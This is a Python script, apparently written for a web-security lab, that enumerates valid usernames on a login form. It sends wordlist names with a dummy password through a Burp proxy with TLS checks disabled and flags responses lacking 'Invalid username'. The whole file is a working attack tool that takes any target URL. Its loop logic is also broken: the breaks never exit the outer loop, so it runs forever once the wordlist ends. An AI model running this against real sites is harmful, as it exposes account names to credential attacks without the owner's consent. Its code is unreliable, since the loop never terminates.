import requests
import sys
import urllib3

# Disable certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Send requests through Burp
burp = {'https': 'http://127.0.0.1:8080'}

payloadFile = 'D:\EH-Tools\Payloads\Credentials\sample-first-names.txt'
payload = open(payloadFile, 'r')

def getValidUsername(targetUrl):
    while True:
        ulist = [payload.readline().strip('\n')]
        for username in ulist:
                if username == '':
                    break
                else:
                    params = {'username': username,'password': 'd'} 
                    r = requests.post(targetUrl, data=params, verify=False, proxies=burp)
                    if "Invalid username" not in r.text:
                        print(username)
                        break
    payload.close()

def main():
    if len(sys.argv) !=2:                                                # If input is NOT name of program and URL str,
        print("(+) Usage: %s <url>" % sys.argv[0])                       # Print (name of program), (url) -> %s to convert name to string, where %s appears -> % to denote %s value
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)                                                     # Exit program after incorrect run
    
    targetUrl = sys.argv[1]
    print("(+) Retrieving valid username...")
    getValidUsername(targetUrl)


if __name__ == "__main__":
    main()
